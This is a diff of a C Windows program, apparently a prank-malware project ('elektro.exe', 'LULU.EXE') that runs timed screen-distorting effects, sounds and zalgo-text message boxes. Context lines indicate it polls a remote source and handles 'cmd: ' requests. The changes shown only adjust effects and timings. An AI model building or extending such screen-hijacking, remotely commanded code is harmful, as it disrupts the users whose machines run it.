@@ -505,12 +505,12 @@ void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs'
         else if (GetTickCount64() - elapsed < 5000) {fkngmelter();}
         else if (GetTickCount64() - elapsed < 10000) {pixelate();squaryshapez();}
         else if (GetTickCount64() - elapsed < 13000) {heightglitch_run();mtrfkngatombomb();}
-        else if (GetTickCount64() - elapsed < 14000) {pixelate();}
+        else if (GetTickCount64() - elapsed < 14000) {pixelate();whitenoise_sfx(2);}
         else if (GetTickCount64() - elapsed < 17000) {widthglitch_run();mtrfkngatombomb();}
         else if (GetTickCount64() - elapsed < 21000) {lulu();squaryshapez();}
         else if (GetTickCount64() - elapsed < 23000) {pixelate();squarewave_sfx(40, 1);}
-        else if (GetTickCount64() - elapsed < 25000) {ltunnel_run();pixelate();}
-        else if (GetTickCount64() - elapsed < 33000) {pixelate();}
+        else if (GetTickCount64() - elapsed < 25000) {ltunnel_run();pixelate();whitenoise_sfx(2);}
+        else if (GetTickCount64() - elapsed < 33000) {pixelate();squarewave_sfx(60, 1);}
         else if (GetTickCount64() - elapsed < 36000) {tunnel_run();mtrfkngatombomb();}
         else if (GetTickCount64() - elapsed < 43000) {mtrfkngatombomb();squaryshapez();}
         else if (GetTickCount64() - elapsed < 44000) {mtrfkngatombomb();pixelate();}
@@ -526,7 +526,7 @@ void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs'
 void wrongchoose() {
     ULONGLONG elapsed = GetTickCount64();
     MessageBoxW(NULL, L"Sai chi e' Lulu'?", L"elektro.exe", MB_YESNO | MB_ICONINFORMATION); // la (L"xyz") server per fare l'unicode e non ansi. Altrimenti le robbe tipo "eùàò" si sminchianoo
-    MessageBoxW(NULL, L"3͘_̝͙̲̏ͪ̌̇̓̚͞L̸̢̰̙̖̣ͪ̌̋ͮ͊̎̄̂͞3̪̪7̨̧͍̩̤̪ͨ͆̿ͪ́ͨ_̖̼̞̭̳͔̽͗̽͌̀̆́̚T̨̫͇̭͔͓̬̪̙̯̐ͧ̏̾̃͌͞͞R̷̡̤͍̬̗͇̻̖͕͈ͧ͑́̐͒̓̒ͯ͌̀͑ͧ̆̆̾͌̈͘̕̚̚͜͡ͅͅ0̶̨̜̯͉͎̞͈̘͙̺͖͍̆̇̎͑ͦ̍̓̀ͨ̑̑͌́̑̆͘͠͡W̝̲̥̪̦͔͇̻̼̞̫̮͖̐͛̆ͥ͌̉͆̐̏̑́ͮ͝͡͡4̵̴̧̢̧̤̝͙̝̘̰͉͙̃̄̎́̊̚͢S̸̨̢͇̯̯͍̗̟̺̤͖̯͕̹̟̯͎̗͔͇ͫ̋ͮͥͤ̆ͦ̑̽̇̒̌̕͡͝͞H̺̩̠̖̑͊̀̓̄ͣͦͅ3̩̍̇R̸̶̨̡̛̟͎̼̤̩̭̫͈͚͖̼̖̬̯̤̗̠̻͔̋ͭͥ̿͛̐̌̃͐̂̉ͨͥ̀̆͘͟͜͢͡͞͡͝3̵̸̸̨̧̛̪͖̦̮̱͚̠ͧ̉̀͌͂̀̈́͜ͅ", L"LULU.EXE", MB_OK | MB_ICONERROR); // idem qui, però l'ultima volta non è andato il testo unicode
+    MessageBoxW(NULL, L"3͘_̝͙̲̏ͪ̌̇̓̚͞L̸̢̰̙̖̣ͪ̌̋ͮ͊̎̄̂͞3̪̪7̨̧͍̩̤̪ͨ͆̿ͪ́ͨ_̖̼̞̭̳͔̽͗̽͌̀̆́̚T̨̫͇̭͔͓̬̪̙̯̐ͧ̏̾̃͌͞͞R̷̡̤͍̬̗͇̻̖͕͈ͧ͑́̐͒̓̒ͯ͌̀͑ͧ̆̆̾͌̈͘̕̚̚͜͡ͅͅ0̶̨̜̯͉͎̞͈̘͙̺͖͍̆̇̎͑ͦ̍̓̀ͨ̑̑͌́̑̆͘͠͡W̝̲̥̪̦͔͇̻̼̞̫̮͖̐͛̆ͥ͌̉͆̐̏̑́ͮ͝͡͡4̵̴̧̢̧̤̝͙̝̘̰͉͙̃̄̎́̊̚͢S̸̨̢͇̯̯͍̗̟̺̤͖̯͕̹̟̯͎̗͔͇ͫ̋ͮͥͤ̆ͦ̑̽̇̒̌̕͡͝͞H̺̩̠̖̑͊̀̓̄ͣͦͅ3̩̍̇R̸̶̨̡̛̟͎̼̤̩̭̫͈͚͖̼̖̬̯̤̗̠̻͔̋ͭͥ̿͛̐̌̃͐̂̉ͨͥ̀̆͘͟͜͢͡͞͡͝3̵̸̸̨̧̛̪͖̦̮̱͚̠ͧ̉̀͌͂̀̈́͜ͅ3͘_̝͙̲̏ͪ̌̇̓̚͞L̸̢̰̙̖̣ͪ̌̋ͮ͊̎̄̂͞3̪̪7̨̧͍̩̤̪ͨ͆̿ͪ́ͨ_̖̼̞̭̳͔̽͗̽͌̀̆́̚T̨̫͇̭͔͓̬̪̙̯̐ͧ̏̾̃͌͞͞R̷̡̤͍̬̗͇̻̖͕͈ͧ͑́̐͒̓̒ͯ͌̀͑ͧ̆̆̾͌̈͘̕̚̚͜͡ͅͅ0̶̨̜̯͉͎̞͈̘͙̺͖͍̆̇̎͑ͦ̍̓̀ͨ̑̑͌́̑̆͘͠͡W̝̲̥̪̦͔͇̻̼̞̫̮͖̐͛̆ͥ͌̉͆̐̏̑́ͮ͝͡͡4̵̴̧̢̧̤̝͙̝̘̰͉͙̃̄̎́̊̚͢S̸̨̢͇̯̯͍̗̟̺̤͖̯͕̹̟̯͎̗͔͇ͫ̋ͮͥͤ̆ͦ̑̽̇̒̌̕͡͝͞H̺̩̠̖̑͊̀̓̄ͣͦͅ3̩̍̇R̸̶̨̡̛̟͎̼̤̩̭̫͈͚͖̼̖̬̯̤̗̠̻͔̋ͭͥ̿͛̐̌̃͐̂̉ͨͥ̀̆͘͟͜͢͡͞͡͝3̵̸̸̨̧̛̪͖̦̮̱͚̠ͧ̉̀͌͂̀̈́͜ͅ", L"LULU.EXE", MB_OK | MB_ICONERROR); // idem qui, però l'ultima volta non è andato il testo unicode
     while(1) {
         if (GetTickCount64() - elapsed < 60000) {lulu();pixelate();mtrfkngatombomb();}
         else if (GetTickCount64() - elapsed < 80000) {fkngmelter();mtrfkngatombomb();}
@@ -641,7 +641,7 @@ int main() {
 
         else if (strcmp(reqtextbuffer, "IDLE") == 0) {
             int i;
-            for (i=0;i<200;i++) {idlefx();}
+            for (i=0;i<500;i++) {idlefx();}
         }
 
         else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
